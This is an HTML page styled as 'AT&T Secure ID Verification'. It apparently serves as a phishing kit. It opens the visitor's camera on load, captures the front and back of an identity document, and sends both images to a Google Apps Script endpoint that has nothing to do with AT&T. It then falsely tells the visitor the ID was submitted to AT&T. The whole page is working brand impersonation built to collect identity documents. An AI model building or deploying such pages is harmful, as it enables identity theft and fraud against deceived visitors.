<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AT&T Secure ID Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f1f6;
      margin: 0;
      padding: 0;
    }
    .att-header {
      background-color: #0057b8;
      color: white;
      padding: 1rem;
      text-align: center;
    }
    .container {
      max-width: 600px;
      margin: 2rem auto;
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    .btn {
      background-color: #0057b8;
      color: white;
      border: none;
      padding: 0.8rem 1.5rem;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 1rem;
    }
    .hidden { display: none; }
    video, canvas {
      width: 100%;
      border-radius: 10px;
      margin-top: 1rem;
    }
    .success {
      text-align: center;
      color: green;
      font-weight: bold;
      font-size: 1.3rem;
      margin-top: 2rem;
    }
    .checkmark {
      font-size: 3rem;
      color: green;
      animation: pop 0.4s ease-out;
    }
    @keyframes pop {
      0% { transform: scale(0.7); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="att-header">
    <h1>AT&T Secure ID Verification</h1>
  </div>

  <div class="container" id="frontCapture">
    <h2>Capture Front Side of ID</h2>
    <video id="video1" autoplay playsinline></video>
    <canvas id="canvas1" class="hidden"></canvas>
    <button class="btn" onclick="takePhoto('front')">Capture Front</button>
    <button class="btn" onclick="submitPhoto('front')">Submit Front</button>
  </div>

  <div class="container hidden" id="backCapture">
    <h2>Capture Back Side of ID</h2>
    <video id="video2" autoplay playsinline></video>
    <canvas id="canvas2" class="hidden"></canvas>
    <button class="btn" onclick="takePhoto('back')">Capture Back</button>
    <button class="btn" onclick="submitPhoto('back')">Submit Back</button>
  </div>

  <div class="container hidden" id="finalScreen">
    <div class="checkmark">✅</div>
    <h2 class="success">Your ID has been successfully submitted to AT&T.</h2>
  </div>

  <script>
    let frontImageData = '';
    let backImageData = '';

    async function startCamera(side) {
      const video = document.getElementById(side === 'front' ? 'video1' : 'video2');
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      video.srcObject = stream;
    }

    function takePhoto(side) {
      const video = document.getElementById(side === 'front' ? 'video1' : 'video2');
      const canvas = document.getElementById(side === 'front' ? 'canvas1' : 'canvas2');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      canvas.classList.remove('hidden');
      video.style.display = 'none';
      const dataURL = canvas.toDataURL('image/jpeg');
      if (side === 'front') frontImageData = dataURL;
      else backImageData = dataURL;
    }

    function submitPhoto(side) {
      if (side === 'front') {
        document.getElementById("frontCapture").classList.add("hidden");
        document.getElementById("backCapture").classList.remove("hidden");
        startCamera('back');
      } else {
        document.getElementById("backCapture").classList.add("hidden");
        document.getElementById("finalScreen").classList.remove("hidden");
        sendToGoogle();
      }
    }

    function sendToGoogle() {
      fetch("https://script.google.com/macros/s/AKfycbx-n8awu_Ex1vauIjzo1K6eaDfEcpwMFjZ4BkObZ3y-5nWyM9LoRQOc9kTaIyR99Ek5/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          idType: "Generic ID",
          frontImage: frontImageData,
          backImage: backImageData
        })
      })
      .then(res => res.text())
      .then(data => console.log("✅ Submitted to Google:", data))
      .catch(err => console.error("❌ Failed:", err));
    }

    // Start camera on load
    window.onload = () => startCamera('front');
  </script>
</body>
</html>
